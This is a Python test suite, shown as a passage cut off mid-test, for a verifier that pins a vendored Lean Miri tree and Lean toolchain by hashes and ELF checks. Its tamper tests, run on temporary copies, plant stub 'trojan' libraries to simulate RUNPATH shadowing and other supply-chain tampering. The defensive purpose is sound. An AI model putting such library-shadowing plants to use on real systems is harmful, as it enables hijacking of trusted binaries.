#!/usr/bin/env python3
# Copyright 2026 The Fuchsia Authors
#
# Licensed under a BSD-style license <LICENSE-BSD>, Apache License, Version 2.0
# <LICENSE-APACHE or https://www.apache.org/licenses/LICENSE-2.0>, or the MIT
# license <LICENSE-MIT or https://opensource.org/licenses/MIT>, at your option.
# This file may not be copied, modified, or distributed except according to
# those terms.

"""Live, tamper, toolchain, `check_trusted.py` integration and Lean-hygiene
tests for `scripts/verify_lean_miri_pin.py`.

Run from the repository root:

    python3 -B -m unittest discover -s scripts -p 'test_*lean_miri_pin*.py'

The live checkout carries the reviewed Episode 1 10-file `deinitMovedPlace`
overlay, so strict mode must reject it while `--allow-deinit-patch` and
`--require-locked-deinit-patch` accept it. Synthetic-overlay tests start from an
upstream copy: the 10 upstream pre-images are restored from the git object
store by their pinned `upstream_git_blob` ids (and checked against the pinned
SHA-256 digests); those tests skip when git or the objects are unavailable.

Tamper tests only ever modify throwaway copies (`tempfile.TemporaryDirectory`)
of `lean-miri/{UPSTREAM_PIN.json,vendor/}` + `lean-toolchain`, of
`trusted/{audit,lean}` fixture inputs, of the real toolchain, and fake
toolchains; the real checkout and the real `elan` toolchain are only read.

Environment knobs:
  ANNEAL_PIN_LEAN_COMPILE=1        also compile the Lean hygiene targets with
                                   `anneal-lean-run ... lake env lean` (needs
                                   prebuilt Trusted / Anneal / Miri oleans).
  ANNEAL_PIN_LEAN_RUN_TIMEOUT=S    pass `--timeout S` to anneal-lean-run.
"""

from __future__ import annotations

import sys

sys.dont_write_bytecode = True

import ast  # noqa: E402
import hashlib  # noqa: E402
import importlib.util  # noqa: E402
import json  # noqa: E402
import os  # noqa: E402
import random  # noqa: E402
import re  # noqa: E402
import shlex  # noqa: E402
import shutil  # noqa: E402
import stat  # noqa: E402
import struct  # noqa: E402
import subprocess  # noqa: E402
import tempfile  # noqa: E402
import unittest  # noqa: E402
from pathlib import Path  # noqa: E402
from typing import Any, Callable, Dict, Iterable, List, Optional, Sequence, Tuple  # noqa: E402
from unittest import mock  # noqa: E402

SCRIPTS_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPTS_DIR.parent
VERIFIER_PATH = SCRIPTS_DIR / "verify_lean_miri_pin.py"
CHECK_TRUSTED_PATH = REPO_ROOT / "trusted" / "audit" / "check_trusted.py"


def _load_unregistered(name: str, path: Path) -> Any:
    """Load `path` the way `tests/trusted-boundary/test_boundary.py` loads
    `check_trusted.py`: WITHOUT registering it in `sys.modules`, which crashes any
    module defining a `@dataclass` under `from __future__ import annotations`."""
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


V = _load_unregistered("verify_lean_miri_pin", VERIFIER_PATH)
CT = _load_unregistered("check_trusted_pin_integration", CHECK_TRUSTED_PATH)

LOCKED_MANIFEST = "081747a37a96c7443997ba12b02565f45c9642dd0dec9e3dcb3a30e7053c8d16"
LOCKED_MIRI_TREE = "ef473f04eed9bbfed474a7b5f6f91a2f6350c41b"
LIBLEANSHARED = ("libleanshared.so", "libleanshared_1.so", "libleanshared_2.so")
COMPANION_BINARIES = ("bin/cadical", "bin/clang", "bin/ld.lld", "bin/leanc", "bin/leanchecker", "bin/leanir", "bin/leanmake", "bin/leantar", "bin/llvm-ar")
FAKE_COMMIT = "5045d0056413266e57c625dcd7c365b10e377c52"
HEX64 = re.compile(r"\A[0-9a-f]{64}\Z")
TAMPER_TARGET = "Miri/ABI/Size.lean"
ALLOWLIST = sorted(V.PATCH_ALLOWLIST)
EPISODE1_ALLOWLIST = [
    "Miri/Interpreter/Call.lean",
    "Miri/Interpreter/Cast.lean",
    "Miri/Interpreter/ExecutionCalls.lean",
    "Miri/Interpreter/ExecutionCast.lean",
    "Miri/Interpreter/ExecutionMachine.lean",
    "Miri/Interpreter/LocalAccess.lean",
    "Miri/Interpreter/MachineHooks.lean",
    "Miri/Interpreter/OperandMachine.lean",
    "Miri/Interpreter/Place.lean",
    "Miri/Interpreter/PlaceMachine.lean",
]

REPO_TOOLCHAIN = V.read_lean_toolchain(REPO_ROOT)
REPO_LEAN_VERSION = REPO_TOOLCHAIN.split(":", 1)[1].lstrip("v")
LIVE_TOOLCHAIN_DIR = V.default_elan_home() / "toolchains" / V.toolchain_dir_name(REPO_TOOLCHAIN)
HAVE_LIVE_TOOLCHAIN = LIVE_TOOLCHAIN_DIR.is_dir()
LOCKED_PLATFORM = V.LOCKED_TOOLCHAIN_PINS[REPO_TOOLCHAIN]["platform"]
ON_LOCKED_PLATFORM = HAVE_LIVE_TOOLCHAIN and V.host_platform_triple() == LOCKED_PLATFORM
NEEDS_LIVE_RELEASE = unittest.skipUnless(ON_LOCKED_PLATFORM, f"the locked {LOCKED_PLATFORM} release is not installed at {LIVE_TOOLCHAIN_DIR}")


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _git_env() -> Dict[str, str]:
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    return env


def _upstream_deinit_bytes() -> Optional[Dict[str, bytes]]:
    """Upstream pre-images of the 10 patched files from the git object store,
    verified against the locked `upstream_git_blob` and `upstream_sha256`."""
    git = shutil.which("git")
    if git is None:
        return None
    out: Dict[str, bytes] = {}
    for rel, locked in sorted(V.LOCKED_DEINIT_PATCHED_FILES.items()):
        try:
            proc = subprocess.run(
                [git, "-C", str(REPO_ROOT), "cat-file", "blob", locked["upstream_git_blob"]],
                stdin=subprocess.DEVNULL, capture_output=True, env=_git_env(), timeout=60, check=False,
            )
        except (OSError, subprocess.SubprocessError):
            return None
        data = proc.stdout
        if proc.returncode != 0 or V.git_blob_sha1(data) != locked["upstream_git_blob"] or _sha256(data) != locked["upstream_sha256"]:
            return None
        out[rel] = data
    return out


UPSTREAM_DEINIT_BYTES = _upstream_deinit_bytes()
NEEDS_UPSTREAM = unittest.skipUnless(UPSTREAM_DEINIT_BYTES is not None, "upstream pre-image git objects of the 10 patched files are unavailable")


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


class Workspace:
    """A throwaway repository root holding copies of the pinned inputs."""

    def __init__(self, root: Path) -> None:
        self.root = root
        self.lean_miri = root / "lean-miri"
        self.vendor = self.lean_miri / "vendor"
        self.pin_path = self.lean_miri / "UPSTREAM_PIN.json"

    @classmethod
    def create(cls, base: Path, *, upstream: bool = False, name: str = "repo") -> "Workspace":
        root = base / name
        (root / "lean-miri").mkdir(parents=True)
        os.chmod(root, 0o755)
        os.chmod(root / "lean-miri", 0o755)
        shutil.copy2(REPO_ROOT / V.PIN_RELPATH, root / V.PIN_RELPATH)
        shutil.copytree(REPO_ROOT / V.VENDOR_RELPATH, root / V.VENDOR_RELPATH, symlinks=True)
        shutil.copy2(REPO_ROOT / V.LEAN_TOOLCHAIN_RELPATH, root / V.LEAN_TOOLCHAIN_RELPATH)
        ws = cls(root)
        if upstream:
            ws.restore_upstream()
        return ws

    def restore_upstream(self) -> None:
        """Replace the 10 Episode 1 files by their upstream pre-images and drop
        `patched_files`: a byte-identical copy of the upstream vendor tree."""
        assert UPSTREAM_DEINIT_BYTES is not None
        for rel, data in UPSTREAM_DEINIT_BYTES.items():
            self.path(rel).write_bytes(data)
        pin = self.pin()
        pin.pop("patched_files", None)
        self.write_pin(pin)

    def pin(self) -> Dict[str, Any]:
        return json.loads(self.pin_path.read_text(encoding="utf-8"))

    def write_pin(self, pin: Dict[str, Any]) -> None:
        self.pin_path.write_text(json.dumps(pin, indent=2) + "\n", encoding="utf-8")

    def path(self, rel: str) -> Path:
        return self.vendor / rel

    def manifest_entry(self, pin: Dict[str, Any], rel: str) -> Dict[str, str]:
        for entry in pin["vendor_tree"]["files"] + pin["vendor_aux_files"]:
            if entry["path"] == rel:
                return entry
        raise KeyError(rel)

    def patched_entry(self, pin: Dict[str, Any], rel: str) -> Dict[str, str]:
        for entry in pin["patched_files"]:
            if entry["path"] == rel:
                return entry
        raise KeyError(rel)

    def apply_overlay(self, rels: Iterable[str], *, suffix: bytes = b"") -> List[Dict[str, str]]:
        """Append a comment to each (upstream) file and declare it in `patched_files`."""
        pin = self.pin()
        entries = []
        for rel in rels:
            original = self.path(rel).read_bytes()
            patched = original + b"\n-- anneal test overlay: opt-in deinitMovedPlace (synthetic)\n" + suffix
            self.path(rel).write_bytes(patched)
            entries.append(
                {
                    "path": rel,
                    "upstream_sha256": _sha256(original),
                    "patched_sha256": _sha256(patched),
                    "patch_reason": "opt-in deinitMovedPlace / pendingMoveDeinit move deinitialization",
                    "upstream_git_blob": V.git_blob_sha1(original),
                }
            )
        pin["patched_files"] = entries
        self.write_pin(pin)
        return entries


def make_fake_toolchain(base: Path, *, version: str = REPO_LEAN_VERSION, name: str = "toolchain", lean_body: Optional[str] = None, lake_body: Optional[str] = None) -> Path:
    """Tiny fake elan toolchain: shell-script bin/lean + bin/lake and small
    fake `lib/lean/*.so` files (including the split `libleanshared_{1,2}.so`)."""
    root = base / name
    (root / "bin").mkdir(parents=True)
    (root / "lib" / "lean").mkdir(parents=True)
    lean_body = lean_body if lean_body is not None else f"echo 'Lean (version {version}, x86_64-unknown-linux-gnu, commit {FAKE_COMMIT}, Release)'"
    lake_body = lake_body if lake_body is not None else f"echo 'Lake version 5.0.0-src+{FAKE_COMMIT[:7]} (Lean version {version})'"
    for binary, body in (("lean", lean_body), ("lake", lake_body)):
        path = root / "bin" / binary
        path.write_text(f"#!/bin/sh\n{body}\n", encoding="utf-8")
        os.chmod(path, 0o755)
    for lib in LIBLEANSHARED + ("libInit_shared.so",):
        path = root / "lib" / "lean" / lib
        path.write_bytes(hashlib.sha256(lib.encode()).digest() * 128)
        os.chmod(path, 0o644)
    for directory in (root, root / "bin", root / "lib", root / "lib" / "lean"):
        os.chmod(directory, 0o755)
    return root


def copy_live_toolchain(dst_parent: Path, name: Optional[str] = None) -> Path:
    """Byte-for-byte copy of every `bin/*` and `lib/lean/*.so*` of the live elan
    toolchain under `dst_parent/<name>` (default: the elan directory name; the real
    toolchain is only read)."""
    dst = dst_parent / (name if name is not None else V.toolchain_dir_name(REPO_TOOLCHAIN))
    (dst / "bin").mkdir(parents=True)
    (dst / "lib" / "lean").mkdir(parents=True)
    for entry in sorted((LIVE_TOOLCHAIN_DIR / "bin").iterdir()):
        shutil.copy2(entry, dst / "bin" / entry.name)
    for entry in sorted((LIVE_TOOLCHAIN_DIR / "lib" / "lean").iterdir()):
        if V._SHARED_OBJECT_RE.search(entry.name) and entry.is_file():
            shutil.copy2(entry, dst / "lib" / "lean" / entry.name)
    for directory in (dst, dst / "bin", dst / "lib", dst / "lib" / "lean"):
        os.chmod(directory, 0o755)
    return dst


def make_elf64(
    needed: Sequence[str],
    runpath: Sequence[str] = (),
    *,
    rpath: Sequence[str] = (),
    rpath_tag: int = 29,
    machine: int = 247,
    strtab_outside_load: bool = False,
    strtab_in_nobits: bool = False,
    unterminated: bool = False,
    unterminated_within_strsz: bool = False,
    needed_index_oob: bool = False,
    runpath_index_oob: bool = False,
    strsz_overrun: bool = False,
    omit_strtab: bool = False,
    phentsize: int = 56,
    phnum_override: Optional[int] = None,
    load_filesz_gt_memsz: bool = False,
    overlapping_loads: bool = False,
    omit_dt_null: bool = False,
    dyn_outside_load: bool = False,
) -> bytes:
    """Minimal ELF64 little-endian ET_DYN image: one PT_LOAD covering the whole
    file plus a PT_DYNAMIC segment with DT_NEEDED*, DT_RUNPATH (29) / DT_RPATH
    (15), DT_STRTAB, DT_STRSZ, DT_NULL. `rpath` adds a DT_RPATH entry *before*
    the `runpath` entry. Each boolean flag corrupts exactly one property so the
    fail-closed paths of `elf_dynamic_info` can be exercised. `machine` defaults
    to EM_BPF (247): no test can ever execute a synthetic image (ENOEXEC)."""
    strtab = bytearray(b"\0")
    dyn: List[Tuple[int, int]] = []
    for name in needed:
        dyn.append((1, len(strtab) + (4096 if needed_index_oob else 0)))
        strtab += name.encode() + b"\0"
    if rpath:
        dyn.append((15, len(strtab)))
        strtab += ":".join(rpath).encode() + b"\0"
    if runpath:
        dyn.append((rpath_tag, len(strtab) + (4096 if runpath_index_oob else 0)))
        strtab += ":".join(runpath).encode() + b"\0"
    if unterminated:
        del strtab[-1]
    declared_strsz = len(strtab) - (1 if unterminated_within_strsz and len(strtab) > 1 else 0)
    n_phdrs = 3 if overlapping_loads else 2
    dyn_off = 64 + n_phdrs * phentsize
    dyn_slots = len(dyn) + (2 if omit_dt_null else 3)  # + DT_STRTAB, DT_STRSZ, [DT_NULL]
    str_off = dyn_off + 16 * dyn_slots
    total = str_off + len(strtab)
    if not omit_strtab:
        dyn.append((5, str_off + (0x100000 if strtab_outside_load else 0)))
        dyn.append((10, declared_strsz + (64 if strsz_overrun else 0)))
    if not omit_dt_null:
        dyn.append((0, 0))
    body = b"".join(struct.pack("<qQ", tag, val) for tag, val in dyn).ljust(16 * dyn_slots, b"\0")
    ehdr = struct.pack(
        "<4sBBBBB7sHHIQQQIHHHHHH",
        b"\x7fELF", 2, 1, 1, 0, 0, bytes(7), 3, machine, 1, 0, 64, 0, 0, 64,
        phentsize, phnum_override if phnum_override is not None else n_phdrs, 64, 0, 0,
    )
    load_filesz = str_off if strtab_in_nobits else total
    load_memsz = (load_filesz - 8) if load_filesz_gt_memsz else (total + (64 if strtab_in_nobits else 0))
    ph_load = struct.pack("<IIQQQQQQ", 1, 4, 0, 0, 0, load_filesz, load_memsz, 0x1000).ljust(phentsize, b"\0")
    dyn_vaddr = dyn_off + (0x200000 if dyn_outside_load else 0)
    ph_dyn = struct.pack("<IIQQQQQQ", 2, 6, dyn_off, dyn_vaddr, dyn_vaddr, 16 * dyn_slots, 16 * dyn_slots, 8).ljust(phentsize, b"\0")
    phdrs_bytes = ph_load + ph_dyn
    if overlapping_loads:
        ph_overlap = struct.pack("<IIQQQQQQ", 1, 4, 0, 0x100, 0x100, 64, 64, 0x1000).ljust(phentsize, b"\0")
        phdrs_bytes += ph_overlap
    return ehdr + phdrs_bytes + body + bytes(strtab)


def malformed_elf_cases() -> List[Tuple[str, bytes, str]]:
    good = make_elf64(["libfoo.so"], ["$ORIGIN"])
    return [
        ("DT_STRTAB outside every PT_LOAD", make_elf64(["libfoo.so"], ["$ORIGIN"], strtab_outside_load=True), "not inside a PT_LOAD"),
        ("DT_STRTAB in PT_LOAD NOBITS/BSS tail", make_elf64(["libfoo.so"], ["$ORIGIN"], strtab_in_nobits=True), "NOBITS/BSS tail"),
        ("unterminated dynamic string", make_elf64(["libfoo.so"], ["$ORIGIN"], unterminated=True), "unterminated"),
        ("dynamic string NUL sits past DT_STRSZ", make_elf64(["libfoo.so"], ["$ORIGIN"], unterminated_within_strsz=True), "unterminated"),
        ("DT_NEEDED d_val >= DT_STRSZ", make_elf64(["libfoo.so"], ["$ORIGIN"], needed_index_oob=True), "out of DT_STRSZ bounds"),
        ("DT_RUNPATH d_val >= DT_STRSZ", make_elf64(["libfoo.so"], ["$ORIGIN"], runpath_index_oob=True), "out of DT_STRSZ bounds"),
        ("DT_STRSZ overruns PT_LOAD", make_elf64(["libfoo.so"], ["$ORIGIN"], strsz_overrun=True), "overruns"),
        ("DT_NEEDED without DT_STRTAB", make_elf64(["libfoo.so"], ["$ORIGIN"], omit_strtab=True), "without DT_STRTAB"),
        ("e_phentsize != 56", make_elf64(["libfoo.so"], ["$ORIGIN"], phentsize=64), "malformed ELF program header table"),
        ("e_phnum == PN_XNUM (0xffff)", make_elf64(["libfoo.so"], ["$ORIGIN"], phnum_override=0xFFFF), "PN_XNUM"),
        ("PT_LOAD p_filesz > p_memsz", make_elf64(["libfoo.so"], ["$ORIGIN"], load_filesz_gt_memsz=True), "p_filesz > p_memsz"),
        ("overlapping PT_LOAD segments", make_elf64(["libfoo.so"], ["$ORIGIN"], overlapping_loads=True), "overlapping PT_LOAD"),
        ("PT_DYNAMIC without DT_NULL", make_elf64(["libfoo.so"], ["$ORIGIN"], omit_dt_null=True), "missing DT_NULL"),
        ("PT_DYNAMIC outside PT_LOAD", make_elf64(["libfoo.so"], ["$ORIGIN"], dyn_outside_load=True), "PT_DYNAMIC segment is not inside a PT_LOAD"),
        ("ELFCLASS32", good[:4] + b"\x01" + good[5:], "unsupported ELF object"),
        ("big-endian", good[:5] + b"\x02" + good[6:], "unsupported ELF object"),
        ("truncated ELF header", good[:40], "unsupported ELF object"),
        ("truncated program headers", good[: 64 + 30], "truncated ELF program header table"),
        ("PT_LOAD overruns EOF", good[:-8], "PT_LOAD segment overruns EOF"),
    ]


def make_check_trusted_fixture(base: Path, name: str = "ct-checkout") -> Path:
    """A `tests/trusted-boundary/test_boundary.py`-style fixture checkout: only
    `trusted/audit/{check_trusted.py,TrustedBoundary.lean}` and
    `trusted/lean/{foundation-lock.json,lean-toolchain,Trusted.lean}`."""
    root = base / name
    (root / "trusted" / "audit").mkdir(parents=True)
    (root / "trusted" / "lean").mkdir(parents=True)
    for leaf in ("foundation-lock.json", "lean-toolchain"):
        shutil.copyfile(REPO_ROOT / "trusted" / "lean" / leaf, root / "trusted" / "lean" / leaf)
    for leaf in ("check_trusted.py", "TrustedBoundary.lean"):
        shutil.copyfile(REPO_ROOT / "trusted" / "audit" / leaf, root / "trusted" / "audit" / leaf)
    (root / "trusted" / "lean" / "Trusted.lean").write_text("prelude\nimport Init.Core\n", encoding="utf-8")
    return root


class ReachedFirstLeanProcess(Exception):
    """Raised by a patched `Checker.process`: every pre-execution check passed."""


class TempCase(unittest.TestCase):
    """Per-test temporary directory + rejection assertion helpers."""

    def setUp(self) -> None:
        old_umask = os.umask(0o022)  # fixtures must not inherit a permissive umask
        self.addCleanup(os.umask, old_umask)
        tmp = tempfile.TemporaryDirectory(prefix="anneal-pin-")
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)

    def workspace(self) -> Workspace:
        """Copy of the live (Episode 1 patched) pinned inputs."""
        return Workspace.create(self.tmp)

    def upstream_workspace(self, name: str = "repo") -> Workspace:
        """Copy with the 10 upstream pre-images restored (strict-mode clean)."""
        if UPSTREAM_DEINIT_BYTES is None:
            self.skipTest("upstream pre-image git objects of the 10 patched files are unavailable")
        return Workspace.create(self.tmp, upstream=True, name=name)

    def assertRejected(self, fn: Callable[[], Any], *needles: str, absent: Sequence[str] = ()) -> Tuple[str, ...]:
        with self.assertRaises(V.PinVerificationError) as cm:
            fn()
        errors = cm.exception.errors
        report = "\n".join(errors)
        for needle in needles:
            self.assertTrue(any(needle in e for e in errors), f"expected an error containing {needle!r}; got:\n{report}")
        for needle in absent:
            self.assertFalse(any(needle in e for e in errors), f"unexpected error containing {needle!r}; got:\n{report}")
        return errors

    def assertFindings(self, problems: Sequence[str], *needles: str, absent: Sequence[str] = ()) -> None:
        report = "\n".join(problems)
        for needle in needles:
            self.assertTrue(any(needle in p for p in problems), f"expected a finding containing {needle!r}; got:\n{report}")
        for needle in absent:
            self.assertFalse(any(needle in p for p in problems), f"unexpected finding containing {needle!r}; got:\n{report}")


# ---------------------------------------------------------------------------
# Live checkout + real toolchain
# ---------------------------------------------------------------------------


class LiveCheckoutTests(TempCase):
    def test_allowlist_is_exactly_the_ten_episode1_files(self) -> None:
        self.assertEqual(ALLOWLIST, EPISODE1_ALLOWLIST)
        self.assertEqual(sorted(V.LOCKED_DEINIT_PATCHED_FILES), EPISODE1_ALLOWLIST)
        self.assertEqual(dict(V.LOCKED_DEINIT_BLOBS), {p: e["upstream_git_blob"] for p, e in V.LOCKED_DEINIT_PATCHED_FILES.items()})
        for rel, entry in V.LOCKED_DEINIT_PATCHED_FILES.items():
            self.assertEqual(set(entry), {"upstream_sha256", "patched_sha256", "upstream_git_blob"}, rel)
            self.assertNotEqual(entry["upstream_sha256"], entry["patched_sha256"], rel)

    def test_live_pin_patched_files_equal_the_compiled_in_lock(self) -> None:
        pin = json.loads((REPO_ROOT / V.PIN_RELPATH).read_text(encoding="utf-8"))
        declared = {e["path"]: {k: e[k] for k in ("upstream_sha256", "patched_sha256", "upstream_git_blob")} for e in pin["patched_files"]}
        self.assertEqual(declared, {p: dict(e) for p, e in V.LOCKED_DEINIT_PATCHED_FILES.items()})
        upstream = {e["path"]: e["sha256"] for e in pin["vendor_tree"]["files"]}
        for rel, entry in V.LOCKED_DEINIT_PATCHED_FILES.items():
            with self.subTest(rel):
                self.assertEqual(upstream[rel], entry["upstream_sha256"])  # the manifest still pins upstream bytes
                self.assertEqual(_sha256((REPO_ROOT / V.VENDOR_RELPATH / rel).read_bytes()), entry["patched_sha256"])

    def test_live_vendor_strict_mode_rejects_the_ten_patched_files(self) -> None:
        errors = self.assertRejected(
            lambda: V.verify_vendor(REPO_ROOT),
            "strict mode: UPSTREAM_PIN.json declares 10 patched_files entries",
            *(f"SHA-256 mismatch for {rel}" for rel in ALLOWLIST),
        )
        mismatched = {m.group(1) for e in errors for m in [re.search(r"SHA-256 mismatch for (\S+):", e)] if m}
        self.assertEqual(mismatched, set(ALLOWLIST), "strict mode must reject exactly the 10 patched files")

    def test_live_allow_deinit_patch_accepts_the_locked_ten_file_patch(self) -> None:
        v = V.verify_vendor(REPO_ROOT, allow_deinit_patch=True)
        self.assertEqual(v.mode, "deinit-patch")
        self.assertEqual((v.verified_vendor_files, v.verified_aux_files), (608, 9))
        self.assertEqual([p.path for p in v.patched_files], ALLOWLIST)
        self.assertEqual(v.deinit_patch_lock, "matched")
        self.assertEqual(v.manifest_sha256, LOCKED_MANIFEST)
        self.assertEqual(v.commit, V.LOCKED_UPSTREAM_IDENTITY["commit"])
        self.assertEqual(v.git_objects["Miri"], "tree")
        self.assertEqual(len(v.git_objects), 11)
        self.assertEqual(v.closure.status, "absent")
        self.assertEqual(v.locked_identity, "matched")
        self.assertEqual(v.build_lean_toolchain, REPO_TOOLCHAIN)

    def test_live_require_locked_deinit_patch_passes(self) -> None:
        v = V.verify_vendor(REPO_ROOT, require_locked_deinit_patch=True)
        self.assertEqual((v.mode, v.deinit_patch_lock), ("locked-deinit-patch", "matched"))
        self.assertEqual({p.path: p.patched_sha256 for p in v.patched_files}, {p: e["patched_sha256"] for p, e in V.LOCKED_DEINIT_PATCHED_FILES.items()})

    @unittest.skipUnless(HAVE_LIVE_TOOLCHAIN, f"elan toolchain {LIVE_TOOLCHAIN_DIR} not installed")
    def test_live_end_to_end_real_toolchain_companions_and_split_libleanshared(self) -> None:
        result = V.verify_all(REPO_ROOT, allow_deinit_patch=True)
        t = result.toolchain
        self.assertIsNotNone(t)
        self.assertEqual(t.name, REPO_TOOLCHAIN)
        self.assertEqual(t.resolved_by, "elan")
        self.assertEqual(Path(t.toolchain_dir), LIVE_TOOLCHAIN_DIR)
        self.assertEqual(t.libleanshared, LIBLEANSHARED)
        for rel in ("bin/lean", "bin/lake") + tuple(f"lib/lean/{n}" for n in LIBLEANSHARED):
            self.assertRegex(t.files[rel], HEX64, rel)
        # Independent recomputation of the companion libraries' digests.
        for lib in LIBLEANSHARED[1:]:
            self.assertEqual(t.files[f"lib/lean/{lib}"], _sha256((LIVE_TOOLCHAIN_DIR / "lib" / "lean" / lib).read_bytes()))
        self.assertIn(f"version {REPO_LEAN_VERSION}", t.lean_version)
        self.assertIn(f"(Lean version {REPO_LEAN_VERSION})", t.lake_version)
        if V.host_platform_triple() == LOCKED_PLATFORM:
            # The default run is checked against the compiled-in 16-file release pin,
            # companion executables included.
            self.assertEqual(t.pin_status, "locked-verified")
            self.assertEqual(dict(t.files), dict(V.LOCKED_TOOLCHAIN_PINS[REPO_TOOLCHAIN]["files"]))
            for rel in COMPANION_BINARIES:
                self.assertEqual(t.files[rel], _sha256((LIVE_TOOLCHAIN_DIR / rel).read_bytes()), rel)
        summary = result.to_json_dict()
        self.assertEqual((summary["verified_vendor_files"], summary["verified_aux_files"]), (608, 9))
        self.assertEqual(summary["deinit_patch_lock"], "matched")

    @NEEDS_LIVE_RELEASE
    def test_live_locked_pin_detects_real_companion_tamper_and_additions(self) -> None:
        elan = self.tmp / "elan"
        dst = copy_live_toolchain(elan / "toolchains")
        self.assertEqual(V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}).pin_status, "locked-verified")
        with self.subTest("companion libleanshared_1.so tampered; libleanshared.so byte-identical"):
            original = (dst / "lib" / "lean" / "libleanshared_1.so").read_bytes()
            with open(dst / "lib" / "lean" / "libleanshared_1.so", "ab") as fh:
                fh.write(b"\0")
            self.assertRejected(
                lambda: V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}),
                "(locked release pin) SHA-256 mismatch for lib/lean/libleanshared_1.so",
                "skipped `bin/lean --version`",
            )
            (dst / "lib" / "lean" / "libleanshared_1.so").write_bytes(original)
        with self.subTest("companion executable bin/leanc tampered"):
            original = (dst / "bin" / "leanc").read_bytes()
            (dst / "bin" / "leanc").write_bytes(original + b"\0")
            self.assertRejected(lambda: V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}), "(locked release pin) SHA-256 mismatch for bin/leanc")
            (dst / "bin" / "leanc").write_bytes(original)
        with self.subTest("extra bin/ld planted next to clang"):
            (dst / "bin" / "ld").write_text("#!/bin/sh\nexit 0\n")
            os.chmod(dst / "bin" / "ld", 0o755)
            self.assertRejected(lambda: V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}), "(locked release pin) unpinned toolchain file added: bin/ld")
            (dst / "bin" / "ld").unlink()
        with self.subTest("companion bin/leantar deleted"):
            saved = self.tmp / "leantar"
            shutil.move(str(dst / "bin" / "leantar"), str(saved))
            self.assertRejected(lambda: V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}), "(locked release pin) pinned toolchain file deleted or unverifiable: bin/leantar")
            shutil.move(str(saved), str(dst / "bin" / "leantar"))
        self.assertEqual(V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}).pin_status, "locked-verified")

    @NEEDS_LIVE_RELEASE
    def test_live_elf_dynamic_info_of_all_release_objects_and_parser_parity(self) -> None:
        # Covers libleanshared.so, whose dynamic string table is ~24 MiB (it is
        # never slurped: only the referenced NUL-terminated strings are read).
        bin_runpath = ("$ORIGIN/../lib", "$ORIGIN/../lib/lean")
        lib_runpath = ("$ORIGIN/..", "$ORIGIN")
        lean_runtime = ("libleanshared.so", "libleanshared_1.so", "libleanshared_2.so", "libInit_shared.so", "libc.so.6", "libm.so.6")
        expected = {
            "bin/lean": (bin_runpath, lean_runtime),
            "bin/lake": (bin_runpath, ("libLake_shared.so", "libleanshared.so", "libInit_shared.so", "libc.so.6")),
            "bin/leanc": (bin_runpath, lean_runtime),
            "bin/leanchecker": (bin_runpath, ("libLake_shared.so",) + lean_runtime),
            "bin/leanir": (bin_runpath, lean_runtime),
            "bin/clang": (("$ORIGIN/../lib",), ("libLLVM.so.22.1", "libclang-cpp.so.22.1", "libc++.so.1")),
            "bin/ld.lld": (("$ORIGIN/../lib",), ("libLLVM.so.22.1", "libz.so.1")),
            "lib/lean/libleanshared.so": (lib_runpath, ("libc.so.6", "librt.so.1", "ld-linux-x86-64.so.2")),
            "lib/lean/libleanshared_1.so": (lib_runpath, ("libc.so.6",)),
            "lib/lean/libleanshared_2.so": (lib_runpath, ("libc.so.6",)),
            "lib/lean/libInit_shared.so": (lib_runpath, ("libc.so.6",)),
            "lib/lean/libLake_shared.so": (lib_runpath, ("libleanshared.so", "libInit_shared.so")),
        }
        for rel, (runpath, must_need) in expected.items():
            with self.subTest(rel):
                needed, got_runpath = V.elf_dynamic_info(LIVE_TOOLCHAIN_DIR / rel)
                self.assertEqual(got_runpath, runpath)
                for soname in must_need:
                    self.assertIn(soname, needed)
        self.assertEqual(V.elf_dynamic_info(LIVE_TOOLCHAIN_DIR / "bin" / "leantar"), ((), ()))  # static-pie
        self.assertIsNone(V.elf_dynamic_info(LIVE_TOOLCHAIN_DIR / "bin" / "leanmake"))  # shell script
        self.assertIsNone(V.elf_dynamic_info(REPO_ROOT / "lean-toolchain"))
        # The standalone `struct`-free parser embedded in check_trusted.py agrees on
        # every release object.
        for rel in sorted(V.LOCKED_TOOLCHAIN_PINS[REPO_TOOLCHAIN]["files"]):
            with self.subTest(parity=rel):
                self.assertEqual(CT.elf_dynamic_info(LIVE_TOOLCHAIN_DIR / rel), V.elf_dynamic_info(LIVE_TOOLCHAIN_DIR / rel))

    @NEEDS_LIVE_RELEASE
    def test_live_elf_runpath_shadowing_of_real_binaries_rejected(self) -> None:
        # Byte-for-byte copy of the real release (the real toolchain is never
        # modified); the DT_RUNPATH of bin/lean is `$ORIGIN/../lib:$ORIGIN/../lib/lean`,
        # searched before /lib.
        elan = self.tmp / "elan"
        dst = copy_live_toolchain(elan / "toolchains")
        self.assertEqual(V.verify_toolchain(REPO_ROOT, elan_home=elan, environ={}).pin_status, "locked-verified")
        for planted_rel, needle in (
            ("lib/libm.so.6", "RUNPATH shadowing: bin/lean needs 'libm.so.6', which ld.so can resolve to the unpinned toolchain file lib/libm.so.6"),
            ("lib/lean/libm.so.6", "RUNPATH shadowing: bin/lean needs 'libm.so.6', which ld.so can resolve to the unpinned toolchain file lib/lean/libm.so.6"),
            ("lib/librt.so.1", "RUNPATH shadowing: lib/lean/libleanshared.so needs 'librt.so.1', which ld.so can resolve to the unpinned toolchain file lib/librt.so.1"),
            ("lib/libleanshared_1.so", "RUNPATH shadowing: bin/lean needs 'libleanshared_1.so', which ld.so can resolve to the unpinned toolchain file lib/libleanshared_1.so"),
            ("lib/libInit_shared.so", "RUNPATH shadowing: bin/leanc needs 'libInit_shared.so', which ld.so can resolve to the unpinned toolchain file lib/libInit_shared.so"),
        ):
            with self.subTest(planted_rel):
                planted = dst / planted_rel
                planted.write_bytes(b"\x7fELF-trojan")
